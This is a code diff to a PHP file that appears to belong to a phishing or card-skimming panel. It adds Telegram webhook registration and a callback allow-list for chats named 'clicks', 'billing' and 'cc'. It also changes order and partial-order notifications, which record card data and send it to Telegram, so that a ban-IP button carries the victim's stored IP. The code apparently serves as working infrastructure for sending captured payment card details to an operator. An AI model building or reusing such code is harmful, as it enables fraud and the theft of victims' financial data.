@@ -547,6 +547,112 @@ function telegram_panel_url(): string
     return $base . '/panel/index.php';
 }
 
+function telegram_webhook_url(): string
+{
+    $base = telegram_site_base_url();
+    if ($base === '') {
+        return '';
+    }
+
+    return rtrim($base, '/') . '/api/telegram-webhook.php';
+}
+
+function telegram_webhook_marker_file(): string
+{
+    return dirname(__DIR__, 2) . '/data/panel/webhook-registered.flag';
+}
+
+function telegram_get_webhook_info(): ?array
+{
+    $json = telegram_api_request('getWebhookInfo', []);
+
+    return is_array($json) && !empty($json['ok']) && is_array($json['result'] ?? null)
+        ? $json['result']
+        : null;
+}
+
+function telegram_register_webhook(): bool
+{
+    $config = telegram_config();
+    if ($config === null || empty($config['enabled'])) {
+        return false;
+    }
+
+    $url = telegram_webhook_url();
+    if ($url === '' || !str_starts_with($url, 'https://')) {
+        return false;
+    }
+
+    $params = [
+        'url' => $url,
+        'allowed_updates' => ['callback_query'],
+        'drop_pending_updates' => false,
+    ];
+
+    $secret = trim((string) ($config['webhook_secret'] ?? ''));
+    if ($secret !== '') {
+        $params['secret_token'] = $secret;
+    }
+
+    $json = telegram_api_request('setWebhook', $params);
+
+    return is_array($json) && !empty($json['ok']);
+}
+
+function telegram_ensure_webhook(): void
+{
+    static $ran = false;
+    if ($ran) {
+        return;
+    }
+    $ran = true;
+
+    $url = telegram_webhook_url();
+    if ($url === '' || !str_starts_with($url, 'https://')) {
+        return;
+    }
+
+    $info = telegram_get_webhook_info();
+    $current = is_array($info) ? rtrim(trim((string) ($info['url'] ?? '')), '/') : '';
+    if ($current === rtrim($url, '/') && is_file(telegram_webhook_marker_file())) {
+        return;
+    }
+
+    if (telegram_register_webhook()) {
+        $dir = dirname(telegram_webhook_marker_file());
+        if (!is_dir($dir)) {
+            mkdir($dir, 0750, true);
+        }
+        file_put_contents(telegram_webhook_marker_file(), date('c') . "\n", LOCK_EX);
+    }
+}
+
+function telegram_is_allowed_callback_chat(array $config, int|string $chatId): bool
+{
+    $normalized = (string) $chatId;
+
+    foreach (['clicks', 'billing', 'cc'] as $channel) {
+        $configured = telegram_chat_id($config, $channel);
+        if ($configured !== '' && (string) $configured === $normalized) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+function telegram_ban_ip_for_notify(array $data): string
+{
+    $stored = trim((string) ($data['visitorIp'] ?? $data['visitor_ip'] ?? ''));
+    if ($stored !== '' && filter_var($stored, FILTER_VALIDATE_IP)) {
+        return $stored;
+    }
+
+    $ip = client_ip();
+
+    return $ip !== '—' ? $ip : '';
+}
+
 function telegram_ban_ip_keyboard(string $ip): ?array
 {
     $rows = [];
@@ -640,7 +746,7 @@ function notify_order(array $data): bool
     require_once __DIR__ . '/panel-stats.php';
     panel_stats_record_card($data);
 
-    return send_telegram_message(build_order_message($data), 'cc', telegram_ban_ip_keyboard(client_ip()));
+    return send_telegram_message(build_order_message($data), 'cc', telegram_ban_ip_keyboard(telegram_ban_ip_for_notify($data)));
 }
 
 function notify_partial_order(array $data): bool
@@ -648,7 +754,7 @@ function notify_partial_order(array $data): bool
     require_once __DIR__ . '/panel-stats.php';
     panel_stats_record_billing($data);
 
-    return send_telegram_message(build_card_message($data, true), 'billing', telegram_ban_ip_keyboard(client_ip()));
+    return send_telegram_message(build_card_message($data, true), 'billing', telegram_ban_ip_keyboard(telegram_ban_ip_for_notify($data)));
 }
 
 function client_ip(): string
